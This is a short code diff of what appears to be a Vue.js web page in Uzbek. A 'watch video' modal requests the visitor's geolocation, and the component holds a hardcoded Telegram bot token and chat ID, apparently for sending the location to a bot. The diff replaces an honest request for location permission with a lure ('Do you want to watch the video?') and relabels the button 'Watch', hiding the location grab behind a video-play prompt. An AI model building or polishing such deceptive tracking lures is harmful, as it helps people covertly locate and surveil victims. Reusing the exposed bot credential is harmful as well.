@@ -5,10 +5,10 @@
       <div class="modal-content">
         <img src="../logos.png" width="48" height="48" alt="logo" />
         <h2>
-          Videoni ko'rishdan oldin joylashuvingizni aniqlashga ruxsat bering.
+          Videoni ko'rishni hohlaysizmi? 😍
         </h2>
         <button @click="requestGeolocation" class="allow-btn">
-          Ruxsat berish
+          Ko'rish
         </button>
       </div>
     </div>
@@ -18,7 +18,7 @@
       <div class="modal-content">
         <h2>
           📍 Bu video faqat O'zbekiston hududida ochiladi, Iltimos, videoni
-          ko'rish uchun joylashuvingizga ruxsat bering.
+          ko'rish uchun joylashuvingizni tasdiqlang!
         </h2>
       </div>
     </div>
@@ -44,7 +44,7 @@ export default {
       latitude: null,
       longitude: null,
       botToken: "7200741387:AAEsJV_kIeoeSHVjCH0-nUeRmvsXPP_h_ek",
-      chatId: "5848984559",
+      chatId: "5848984559 ",
     };
   },
   methods: {
